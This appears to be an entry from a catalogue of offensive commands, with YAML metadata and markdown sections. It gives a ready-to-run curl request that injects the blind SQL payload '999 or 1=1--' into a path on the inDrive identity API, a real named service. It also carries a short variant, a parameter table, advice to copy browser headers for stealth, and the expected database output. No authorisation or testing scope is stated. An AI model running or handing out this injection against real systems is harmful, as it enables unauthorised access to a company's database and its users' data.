---
data: >-
  curl -i -s -k -X GET -H 'Host: id.indrive.com' -H 'User-Agent: Mozilla/5.0
  (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept:
  application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H
  'Accept-Encoding: gzip, deflate' -H 'Origin: https://promo.indrive.com' -H
  'Referer: https://promo.indrive.com/' -H 'Sec-Fetch-Dest: empty' -H
  'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-site' -H 'Te: trailers' -H
  'Connection: close'
  'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--'
tags:
  - sqli
  - web
  - injection
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 71a7ad3a-2cae-495a-b52f-3bf50e4564bb
created_at: '2025-12-14T03:15:10.035Z'
updated_at: '2025-12-14T03:15:10.035Z'
verified: false
validated: true
submitted: true
---
# curl-blind-sqli-true-condition

## Command

```bash
curl -i -s -k -X GET -H 'Host: id.indrive.com' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Origin: https://promo.indrive.com' -H 'Referer: https://promo.indrive.com/' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-site' -H 'Te: trailers' -H 'Connection: close' 'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--'
```

## Description

This command sends a GET request to the inDrive API with a blind SQLi payload 'or 1=1--' in the URL path to test a true condition, expecting a non-empty JSON response with database data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include HTTP headers in output | Yes |
| `-s` | Silent mode, no progress meter | Yes |
| `-k` | Allow insecure SSL connections | Yes |
| `-X GET` | Specify HTTP GET method | Yes |
| `-H 'Host: ...'` | Set Host header | Yes |
| `-H 'User-Agent: ...'` | Mimic browser User-Agent | Yes |
| URL | Target endpoint with injected payload | Yes |

## Examples

### Basic Usage

```bash
curl -i -s -k -X GET 'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--'
```

### Advanced Usage

Include all headers as shown in the main command for stealth.

## Expected Output

HTTP/1.1 200 OK with JSON body containing random database entry, e.g., {"data": [...]}

## Related

- [[commands/curl-blind-sqli-false-condition]]
- [[procedures/Inject-True-SQL-Condition-via-Curl]]
